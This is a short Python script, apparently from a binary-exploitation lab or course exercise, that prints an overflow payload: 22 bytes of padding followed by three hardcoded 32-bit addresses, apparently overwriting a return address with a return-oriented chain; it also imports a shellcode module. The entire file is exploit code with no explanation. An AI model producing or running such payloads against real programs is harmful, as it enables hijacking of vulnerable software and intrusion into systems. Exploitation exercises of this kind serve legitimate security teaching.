import struct
import sys
from struct import pack
from shellcode import shellcode

s = "a"*22
sys.stdout.buffer.write(s.encode()+pack("<I",0x08049ff0)+pack("<I",0x080498a0)+pack("<I",0x080c615d))
